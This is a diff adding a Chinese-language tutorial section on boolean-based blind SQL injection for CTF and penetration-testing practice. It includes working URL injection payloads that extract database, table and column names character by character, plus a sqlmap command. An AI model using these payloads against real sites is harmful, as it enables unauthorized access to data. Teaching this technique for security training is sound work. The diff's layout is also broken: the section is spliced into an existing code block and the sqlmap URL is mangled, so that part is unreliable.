@@ -74,7 +74,76 @@ SQL 注入（SQLi）是 Web 安全中最经典、危害最大的漏洞之一。�
     AND ascii(substr(database(), 1, 1)) = 115
     -- 使用二分法缩小范围 (> 或 <)
     AND ascii(substr(database(), 1, 1)) > 100
+    # 布尔盲注 (Boolean-based Blind SQLi) 核心知识与实战指南
+
+当目标页面的前端代码屏蔽了数据库的报错信息，且查询结果不直接显示在页面上，但**页面会根据查询语句的真假（True/False）呈现出两种完全不同的状态**时，就可以使用布尔盲注。
+
+## 1. 核心知识点与必备函数
+
+布尔盲注的核心在于**构造条件判断**和**字符串拆解**。由于只能得到真/假的回答，我们必须把目标数据（如数据库名、密码）拆分成单个字符，再转换成数字进行大小比较。
+
+### A. 字符串截取函数
+将长字符串切割成单个字符，方便逐个猜解。
+* `substr(string, start, length)`: 截取字符串。例：`substr('admin', 1, 1)` 结果为 `'a'`。
+* `substring(string, start, length)`: 用法同上。
+* `mid(string, start, length)`: 用法同上。
+
+### B. 字符转换函数
+将截取出来的单个字符转换为 ASCII 码（数字），利用数学上的大于（`>`）、小于（`<`）进行快速范围缩小。
+* `ascii(char)`: 返回字符的 ASCII 十进制值。例：`ascii('a')` 结果为 `97`。
+* `ord(char)`: 用法同上。
+
+### C. 长度测量函数
+用于确定目标数据的总长度，确定循环猜解的边界。
+* `length(string)`: 返回字符串的字节长度。例：`length('admin')` 结果为 `5`。
+
+---
+
+## 2. 布尔盲注的标准流程
+
+布尔盲注的流程高度模式化，通常分为以下四步：
+
+### Step 1: 寻找注入点并确认真假状态
+判断页面在注入逻辑为真（True）和假（False）时的不同表现特征。
+* **True 页面测试**：`?id=1' AND 1=1 --+` （页面正常显示内容，或显示“You are in”）
+* **False 页面测试**：`?id=1' AND 1=2 --+` （页面内容缺失，或显示“Error”，或跳转）
+* **提取特征**：找到只在 True 页面出现的一个关键词（如特定的长度、特定的提示语），作为后续判断的依据。
+
+### Step 2: 猜解目标数据的长度
+以猜解当前数据库名（`database()`）为例，不断调整数值直到条件成立：
+* `?id=1' AND length(database()) > 5 --+` (如果为真，说明长度大于 5)
+* `?id=1' AND length(database()) = 8 --+` (最终确定长度为 8)
+
+### Step 3: 逐字符猜解数据 (二分法)
+已知长度为 8，接下来针对第 1 到第 8 个字符，利用 ASCII 码表（通常可见字符范围是 32~126）进行**二分法**猜解：
+* **猜第 1 个字符**：
+    * `?id=1' AND ascii(substr(database(), 1, 1)) > 64 --+` (True)
+    * `?id=1' AND ascii(substr(database(), 1, 1)) > 96 --+` (True)
+    * `?id=1' AND ascii(substr(database(), 1, 1)) > 112 --+` (False)
+    * ... 最终精准定位：`?id=1' AND ascii(substr(database(), 1, 1)) = 115 --+` (ASCII 115 对应字符 's')
+* **猜第 2 个字符**：
+    * `?id=1' AND ascii(substr(database(), 2, 1)) > 100 --+`
+* 以此类推，直到完成所有 8 个字符的猜解。
+
+### Step 4: 嵌套查询猜解表名与列名
+将 `database()` 替换为从 `information_schema` 中查询表名和列名的子查询：
+* `?id=1' AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)) > 100 --+`
+
+---
+
+## 3. 实战解题应用方式 (CTF/渗透测试)
+
+在应对各类网安竞赛（如夺旗赛 CTF）的 Web 题目时，布尔盲注由于发包量巨大，**绝对不能纯手工完成**，否则会耗费大量时间。实战中的应用方式主要分为两类：
+
+### 方式一：使用 SQLmap 自动化跑包
+如果题目没有复杂的 WAF（Web 应用防火墙）或要求特定请求格式，直接上工具：
+```bash
+# --technique=B 指定只使用布尔盲注 (Boolean-based)
+sqlmap -u "[http://challenge.site/page?id=1](http://challenge.site/page?id=1)" --technique=B --dbs
     ```
+
+
+
 
 ### B. 时间盲注 (Time-based Blind)
 
